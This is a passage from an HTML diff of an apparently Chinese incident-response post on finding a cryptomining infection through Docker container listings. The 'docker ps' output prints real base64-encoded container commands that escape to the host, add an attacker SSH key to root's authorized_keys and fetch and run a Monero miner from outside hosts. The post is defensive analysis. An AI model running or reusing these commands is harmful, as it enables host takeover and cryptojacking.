-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker ps -a</span>
-
-CONTAINER ID        IMAGE                                                                 COMMAND                  CREATED             STATUS                       PORTS                                         NAMES
-fd3a4ea7e1d9        ubuntu                                                                <span style="color:#d14">&#34;/bin/bash /var/tmp/./crypto/.../httpd-crypto&#34;</span>   <span style="color:#099">11</span> hours ago        Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">11</span> hours ago                                                    
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker ps -a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CONTAINER ID        IMAGE                                                                 COMMAND                  CREATED             STATUS                       PORTS                                         NAMES
+</span></span><span style="display:flex;"><span>fd3a4ea7e1d9        ubuntu                                                                <span style="color:#d14">&#34;/bin/bash /var/tmp/./crypto/.../httpd-crypto&#34;</span>   <span style="color:#099">11</span> hours ago        Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">11</span> hours ago                                                    
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果command无法查看完整，可以用如下命令</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#  查看完整的command</span>
-<span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker ps --no-trunc -a</span>
-
-CONTAINER ID                                                       IMAGE                                                                     COMMAND                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 CREATED             STATUS                       PORTS                                         NAMES
-d4b3ae6385319554d7cff96aa3259fded0e7a63cdaa61d04d0cb7dbf331dabb7   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">2</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> days ago                                                      eloquent_noyce
-902e4c85e42399df5a15d745f8da91bfaa520cf77754cbbe4bda194fb93ec212   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">2</span> days ago          Up <span style="color:#099">2</span> days                                                                  intelligent_taussig
-b5d5a2638c3735cb18b4df540dd85ab17805f2086d4374c432ed7f9182f77c21   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">4</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> days ago                                                      flamboyant_liskov
-55f6154c77cf0239c0df0f15bdbe1a4b67db71f5a61f6ed55ca543af40a429d7   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">4</span> days ago          Up <span style="color:#099">4</span> days                                                                  clever_sammet
-fd3a4ea7e1d9eba40b2a1bb887fc85c798894b23b27f5cc306130cc22c6cf6db   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">2</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> weeks ago                                                     vigilant_lamport
-2079058fc554083300ef6277d1942404bf1318ec057d63a7af81504564e9f5d3   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">4</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> weeks ago                                                     funny_swirles
-b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">7</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">7</span> weeks ago                                                     kind_leakey
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#998;font-style:italic">#  查看完整的command</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker ps --no-trunc -a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CONTAINER ID                                                       IMAGE                                                                     COMMAND                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 CREATED             STATUS                       PORTS                                         NAMES
+</span></span><span style="display:flex;"><span>d4b3ae6385319554d7cff96aa3259fded0e7a63cdaa61d04d0cb7dbf331dabb7   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">2</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> days ago                                                      eloquent_noyce
+</span></span><span style="display:flex;"><span>902e4c85e42399df5a15d745f8da91bfaa520cf77754cbbe4bda194fb93ec212   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">2</span> days ago          Up <span style="color:#099">2</span> days                                                                  intelligent_taussig
+</span></span><span style="display:flex;"><span>b5d5a2638c3735cb18b4df540dd85ab17805f2086d4374c432ed7f9182f77c21   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash&#39;&#34;</span>   <span style="color:#099">4</span> days ago          Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> days ago                                                      flamboyant_liskov
+</span></span><span style="display:flex;"><span>55f6154c77cf0239c0df0f15bdbe1a4b67db71f5a61f6ed55ca543af40a429d7   alpineos/dockerapi                                                        <span style="color:#d14">&#34;/pause&#34;</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span style="color:#099">4</span> days ago          Up <span style="color:#099">4</span> days                                                                  clever_sammet
+</span></span><span style="display:flex;"><span>fd3a4ea7e1d9eba40b2a1bb887fc85c798894b23b27f5cc306130cc22c6cf6db   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">2</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">2</span> weeks ago                                                     vigilant_lamport
+</span></span><span style="display:flex;"><span>2079058fc554083300ef6277d1942404bf1318ec057d63a7af81504564e9f5d3   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">4</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">4</span> weeks ago                                                     funny_swirles
+</span></span><span style="display:flex;"><span>b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine                                                                    <span style="color:#d14">&#34;chroot /host bash -c &#39;echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash&#39;&#34;</span>                                          <span style="color:#099">7</span> weeks ago         Exited <span style="color:#000;font-weight:bold">(</span>1<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">7</span> weeks ago                                                     kind_leakey
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="注意">注意：</h4>
 <p>一般根据完整的 command 可以看到挖矿病毒执行的脚本或者命令</p>
 <h2 id="7查看镜像">7、查看镜像</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
